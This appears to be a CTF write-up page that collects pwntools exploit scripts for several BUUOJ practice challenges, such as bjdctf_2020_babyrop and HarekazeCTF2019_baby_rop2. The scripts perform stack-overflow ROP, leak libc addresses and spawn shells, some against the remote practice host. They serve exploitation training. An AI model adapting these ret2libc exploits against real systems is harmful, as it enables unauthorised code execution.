<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./trsx_2018_rop&quot;</span>)</span><br><span class="line">vul_start_addr=<span class="number">0x08048474</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh=process(<span class="string">&quot;./trsx_2018_rop&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,27410)</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0804849C&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop3_addr=<span class="number">0x0804855d</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(pop3_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)+p32(vul_start_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">write_leak_addr=u32(sh.recv())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_leak_addr))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcbase=write_leak_addr-libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libcbase+libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><p><a href="stack/bjdctf_2020_babyrop/bjdctf_2020_babyrop" title="bjdctf_2020_babyrop">attachment</a></p>
<p>remote</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400733</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">vul_start_addr=<span class="number">0x000000000040067D</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&quot;./bjdctf_2020_babyrop&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25147</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vul_start_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak_puts_got=u64(sh.recv().split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,leak_puts_got)</span><br><span class="line">libcbase=leak_puts_got-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>local</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400733</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004004c9</span></span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">vul_start_addr=<span class="number">0x000000000040067D</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,25147)</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vul_start_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak_puts_got=u64(sh.recv().split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcbase=leak_puts_got-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libcbase+libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><p><a href="stack/bjdctf_2020_babyrop/bjdctf_2020_babystack2" title="bjdctf_2020_babystack2">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">backdoor_addr=<span class="number">0x0000000000400726</span></span><br><span class="line">red_addr=<span class="number">0x0000000000400599</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment">#sh=process(&quot;./bjdctf_2020_babystack2&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26535</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0000000000400827&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(red_addr)+p64(backdoor_addr)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(backdoor_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p><a href="stack/pwn2_sctf_2016/pwn2_sctf_2016" title="pwn2_sctf_2016">attachment</a></p>
<p>local</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,29146)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x080485B7&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuladdr=<span class="number">0x0804852F</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(printf_plt)+p32(vuladdr)+p32(printf_got)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr=u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcbase=printf_addr-libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libcbase+libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;binbash&quot;)</span></span><br><span class="line"><span class="comment">#print(hex(bin_sh_addr))</span></span><br><span class="line">sh.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(vuladdr)+p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>remote</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn2_sctf_2016&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29146</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuladdr=<span class="number">0x0804852F</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(printf_plt)+p32(vuladdr)+p32(printf_got)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr=u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;printf&quot;</span>,printf_addr)</span><br><span class="line">libc_base=printf_addr-libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment">#sh.recv()</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(vuladdr)+p32(bin_sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h3><p><a href="stack/jarvisoj_tell_me_something/jarvisoj_tell_me_something" title="jarvisoj_tell_me_something">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">getflag_addr=<span class="number">0x0000000000400620</span></span><br><span class="line">rdi_addr=<span class="number">0x00000000004006f3</span></span><br><span class="line">sh=process(<span class="string">&quot;./jarvisoj_tell_me_something&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,27880)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(getflag_addr)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h3><p><a href="stack/HarekazeCTF2019_baby_rop2/HarekazeCTF2019_baby_rop2" title="HarekazeCTF2019_baby_rop2">attachment</a></p>
<p><code>rop use __start rather than main</code><br>remote</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&quot;./HarekazeCTF2019_baby_rop2&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26905</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./HarekazeCTF2019_baby_rop2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x00000000004006CA&#x27;)</span></span><br><span class="line"></span><br><span class="line">s_fromat=<span class="number">0x0000000000400790</span></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rdi_pop=<span class="number">0x0000000000400733</span></span><br><span class="line">start_addr=<span class="number">0x0000000000400540</span></span><br><span class="line">rsi_r15_ret=<span class="number">0x0000000000400731</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi_pop)+p64(s_fromat)+p64(rsi_r15_ret)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(start_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_addr=u64(sh.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libcbase=read_addr-libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi_pop)+p64(bin_sh_addr)+p64(system_addr)+p64(start_addr)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>local</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./HarekazeCTF2019_baby_rop2&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26432)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./HarekazeCTF2019_baby_rop2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x00000000004006CB&#x27;)</span></span><br><span class="line"></span><br><span class="line">s_fromat=<span class="number">0x0000000000400790</span></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rdi_pop=<span class="number">0x0000000000400733</span></span><br><span class="line">start_addr=<span class="number">0x0000000000400540</span></span><br><span class="line">rsi_r15_ret=<span class="number">0x0000000000400731</span></span><br><span class="line">ret=<span class="number">0x00000000004004d1</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi_pop)+p64(s_fromat)+p64(rsi_r15_ret)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(start_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_addr=u64(sh.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcbase=read_addr-libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;M&#x27;</span>*<span class="number">0x28</span>+p64(rdi_pop)+p64(bin_sh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h3><p>jarvisoj_level3<br><a href="stack/jarvisoj_level3/jarvisoj_level3" title="jarvisoj_level3">attachment</a><br>remote</p>
